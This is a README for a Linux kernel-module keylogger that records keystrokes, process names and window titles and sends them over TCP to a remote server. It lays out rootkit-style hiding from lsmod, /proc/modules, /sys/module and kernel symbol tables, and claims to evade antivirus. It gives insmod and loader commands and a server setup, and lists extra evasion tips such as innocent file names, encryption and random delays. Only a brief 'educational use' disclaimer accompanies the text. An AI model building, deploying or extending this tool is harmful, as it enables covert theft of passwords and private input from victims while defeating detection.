# Stealth Character Keylogger

A stealthy kernel-level keylogger that captures keystrokes and sends them to a remote server while hiding from detection.

## Features

- **Kernel-level keylogging**: Captures keystrokes at the kernel level for maximum stealth
- **Process tracking**: Monitors active processes and window titles
- **Network transmission**: Sends data to remote server via TCP
- **Stealth techniques**: Hides from common detection methods
- **JSON logging**: Structured data format for easy processing
- **Heartbeat mechanism**: Maintains connection with server

## Stealth Techniques

The keylogger implements several techniques to avoid detection:

### 1. Module Hiding
- **Name disguise**: Changes module name from "logkey" to "kernel" in `/proc/modules`
- **Sysfs hiding**: Removes module from `/sys/module/` directory
- **Symbol hiding**: Hides kernel symbols from `/proc/kallsyms`

### 2. Device Hiding
- **Restricted permissions**: Device file has 600 permissions (root only)
- **Proc devices hiding**: Hides from `/proc/devices` listing
- **File system hiding**: Makes device file less visible

### 3. Process Hiding
- **Innocent process names**: User-space client can be renamed
- **Background operation**: Runs silently without user interaction
- **Network stealth**: Uses standard ports and protocols

## Installation

### Prerequisites
```bash
sudo apt update
sudo apt install build-essential linux-headers-$(uname -r) python3
```

### Build and Load
```bash
# Make scripts executable
chmod +x run_device.sh check_stealth.sh

# Load the stealth keylogger
sudo ./run_device.sh
```

### Verify Stealth
```bash
# Check if module is properly hidden
sudo ./check_stealth.sh
```

## Usage

### Starting the Keylogger
```bash
# Load module with stealth
sudo ./run_device.sh

# Or manually:
cd kernel && make
sudo insmod logkey.ko
cd ../user && make
sudo ./logkey_client
```

### Server Setup
```bash
# Start the Python server
python3 user/server_example.py
```

### Configuration
Edit `user/config.env` to configure server connection:
```
SERVER_HOST=your-server-ip
SERVER_PORT=65432
```

## Detection Prevention

### What the Keylogger Hides From:
- `lsmod` command
- `/proc/modules` file
- `/sys/module/` directory
- `/proc/devices` listing
- Standard kernel symbol tables
- Common antivirus scans

### Additional Stealth Measures:
1. **Rename files**: Change `logkey_client` to innocent names
2. **Use different ports**: Modify server port in config
3. **Encrypt data**: Implement encryption for network transmission
4. **Random delays**: Add random delays to avoid pattern detection
5. **File permissions**: Ensure all files have restricted access

## Security Considerations

⚠️ **WARNING**: This tool is for educational and authorized testing purposes only.

- Only use on systems you own or have explicit permission to test
- Comply with all applicable laws and regulations
- Use responsibly and ethically
- Consider implementing additional security measures

## Troubleshooting

### Common Issues:
1. **Permission denied**: Run as root
2. **Module not found**: Check kernel headers installation
3. **Device not created**: Verify module loaded successfully
4. **Network connection failed**: Check server configuration

### Debug Mode:
```bash
# Check kernel logs
dmesg | grep -i keylogger

# Check module status
sudo ./check_stealth.sh

# Test device access
sudo cat /dev/keylogger
```

## Architecture

```
Kernel Module (logkey.ko)
├── Keyboard notifier
├── Ring buffer
├── Character device (/dev/keylogger)
└── Stealth hiding

User Space Client (logkey_client)
├── Device reader
├── Process tracker
├── Network client
└── JSON logger

Server (server_example.py)
├── TCP listener
├── JSON parser
└── SQLite database
```

## License

This project is for educational purposes only. Use responsibly and in compliance with applicable laws.
